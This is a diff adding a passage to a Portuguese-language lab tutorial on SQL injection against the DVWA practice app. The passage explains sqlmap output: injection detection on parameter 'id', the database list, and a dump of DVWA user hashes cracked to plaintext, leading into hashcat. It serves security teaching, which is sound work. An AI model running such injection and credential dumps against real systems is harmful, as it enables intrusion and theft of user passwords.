@@ -183,6 +183,66 @@ O **sqlmap** faz tudo isso sozinho. Mas ele precisa se passar por você (logado)
 
 **O que cada parte faz:** `-u` = a URL/alvo · `--cookie` = sua sessão · `--batch` = responde "sim" sozinho · `--dbs/-D` = bancos · `--tables/-T` = tabelas · `--columns/-C` = colunas · `--dump` = extrai os dados.
 
+**Entendendo o que aparece no terminal (não se assuste com o monte de texto):**
+
+Quando rodar o 1º comando (detecção), o sqlmap mostra algo assim — você só precisa achar as linhas-chave:
+```
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|
+
+[*] starting @ 16:50:12 /2026-11-25/
+
+[16:50:12] [INFO] testing connection to the target URL
+[16:50:13] [INFO] testing if GET parameter 'id' is dynamic
+[16:50:13] [INFO] GET parameter 'id' appears to be dynamic
+[16:50:13] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[16:50:15] [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
+[16:50:16] [INFO] GET parameter 'id' is 'MySQL >= 5.0 error-based' injectable
+[16:50:17] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[16:50:17] [INFO] the back-end DBMS is MySQL
+GET parameter 'id' is vulnerable.
+web application technology: Apache, PHP
+back-end DBMS: MySQL >= 5.0
+```
+👉 **O que procurar aqui:**
+- A linha **`GET parameter 'id' is vulnerable`** → achou a falha! 🎯
+- As linhas **`Type: boolean-based blind / error-based / UNION query`** → são as técnicas que funcionaram (o sqlmap vai usar a melhor sozinho).
+- **`back-end DBMS is MySQL`** → ele descobriu o tipo de banco (a partir daqui sabe como extrair).
+- Se aparecer alguma pergunta `[y/N]`, o `--batch` já responde por você — não precisa fazer nada.
+
+Quando você adicionar `--dbs`, procure por:
+```
+available databases [2]:
+[*] dvwa
+[*] information_schema
+```
+👉 O **`dvwa`** é o nosso banco (o `information_schema` é o "catálogo" interno do MySQL).
+
+E o **`--dump`** (o prêmio) mostra a tabela com as credenciais:
+```
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------------------------------------------+
+| user    | password                                    |
++---------+---------------------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------------------------------------------+
+```
+👉 **O que procurar aqui:**
+- Cada linha é um **usuário** e o **hash** da senha dele.
+- Repare: o sqlmap até **quebra** os hashes conhecidos e mostra a senha em **parênteses** — ex.: `admin` → `(password)`. (Se ele perguntar "crack them via dictionary-based attack? [Y/n]", é só deixar seguir.)
+
+> 💡 **Resumo do que caçar na tela:** `is vulnerable` (achou) → `available databases` (onde está) → a **tabela do `--dump`** (o que você queria). O resto do texto é o sqlmap "pensando" — pode ignorar.
+
 ### 2.5 Quebrar o hash (do hash ao texto claro)
 
 Os hashes do DVWA são **MD5** (modo `-m 0` no hashcat):
